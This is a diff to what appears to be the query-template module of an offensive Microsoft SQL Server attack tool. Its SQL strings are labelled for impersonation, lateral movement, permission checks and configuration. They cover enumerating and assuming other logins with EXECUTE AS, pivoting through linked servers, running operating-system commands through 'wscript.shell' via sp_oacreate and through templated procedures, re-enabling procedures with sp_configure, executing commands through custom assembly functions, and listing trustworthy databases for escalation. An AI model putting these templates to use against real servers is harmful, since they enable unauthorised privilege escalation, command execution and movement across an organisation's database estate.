@@ -1,23 +1,27 @@
 # Impersonation and authentication queries
-CAN_IMPERSONATE_AS = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';"
-IMPERSONATE_AS_USER = "EXECUTE AS LOGIN = '{username}';"
-AUTHENTICATE_AS_USER = "EXECUTE AS USER = '{username}';"
+CAN_IMPERSONATE_AS_SERVER_PRINCIPAL = "SELECT b.name as username, a.permission_name as permission_name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id ;"
+CAN_IMPERSONATE_AS_DATABASE_PRINCIPAL = "SELECT b.name as username, a.permission_name as permission_name FROM sys.database_permissions a INNER JOIN sys.database_principals b ON a.grantor_principal_id = b.principal_id;"
+GET_USER_SERVER_ROLES = "SELECT p.name AS 'group' FROM sys.server_principals p JOIN sys.server_role_members m ON p.principal_id = m.role_principal_id WHERE m.member_principal_id = SUSER_ID();"
+GET_USER_DATABASE_ROLES = "SELECT p.name AS 'group' FROM sys.database_principals p JOIN sys.database_role_members m ON p.principal_id = m.role_principal_id WHERE m.member_principal_id = SUSER_ID();"
+IMPERSONATE_AS_SERVER_PRINCIPAL = "EXECUTE AS LOGIN = '{username}';"
+IMPERSONATE_AS_DATABASE_PRINCIPAL = "EXECUTE AS USER = '{username}';"
 
 # Lateral movement queries
-LINKABLE_SERVERS = "EXEC sp_linkedservers;"
+GET_LINKABLE_SERVERS = "EXEC sp_linkedservers;"
 OPENQUERY = "SELECT * FROM OPENQUERY(\"{linked_server}\", '{query}');"
 EXEC_AT = "EXEC ('{query}') AT \"{linked_server}\";"
 SP_OAMETHOD = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '{command}';"
-PROCEDURE_EXECUTION = "DECLARE @x AS VARCHAR(100)='{procedure}'; EXEC @x '{command}';"
+PROCEDURE_EXECUTION = "EXEC {procedure} '{command}';"
 
 # General queries
-USER_CONTEXT = "SELECT USER_NAME() as username;"
-SERVER_HOSTNAME = "SELECT @@SERVERNAME AS [ServerName];"
+USER_INFORMATION = "SELECT USER_NAME() as db_user, SYSTEM_USER as server_user;"
+SERVER_INFORMATION = "SELECT @@SERVERNAME as hostname, DEFAULT_DOMAIN() as domain_name, @@VERSION as server_version, @@servicename as instance_name;"
+TRUSTWORTHY_DB_LIST = "SELECT name AS 'name' FROM sys.databases WHERE is_trustworthy_on = 1;"
 
 # Permission checks
-IS_UPDATE_SP_CONFIGURE_ALLOWED = "SELECT IIF(IS_SRVROLEMEMBER('sysadmin', SYSTEM_USER) = 1 OR HAS_PERMS_BY_NAME('sp_configure', 'OBJECT', 'ALTER', SYSTEM_USER) = 1, 'True', 'False') AS [CanChangeConfiguration];"
+IS_UPDATE_SP_CONFIGURE_ALLOWED = "SELECT IIF(HAS_PERMS_BY_NAME('sp_configure', 'OBJECT', 'ALTER', SYSTEM_USER) = 1, 'True', 'False') AS [CanChangeConfiguration];"
+IS_PROCEDURE_ACCESSIBLE = "SELECT CASE WHEN OBJECT_ID('{procedure}', 'X') IS NOT NULL THEN 'True' ELSE 'False' END AS [is_accessible];"
 IS_PROCEDURE_ENABLED = "SELECT CASE WHEN (SELECT value_in_use FROM sys.configurations WHERE name = '{procedure}') = 1 THEN 'True' ELSE 'False' END AS [procedure];"
-IS_PROCEDURE_EXECUTABLE = "SELECT IIF(HAS_PERMS_BY_NAME('{procedure}', 'OBJECT', 'EXECUTE') = 1, 1, 0) AS [HasPermission];"
 
 # Configuration queries
 RECONFIGURE_PROCEDURE = "EXEC sp_configure '{procedure}', {status}; RECONFIGURE;"
@@ -35,3 +39,6 @@ DROP_ASSEMBLY = "DROP ASSEMBLY {asm_name};"
 DROP_FUNCTION = "DROP FUNCTION {function_name};"
 FUNCTION_EXECUTION = "SELECT dbo.{function_name}({command});"
 LDAP_QUERY = "SELECT * FROM 'LDAP://localhost:{port}'"
+
+
+# SELECT name, type_desc FROM sys.server_principals WHERE type_desc = 'SQL_LOGIN';
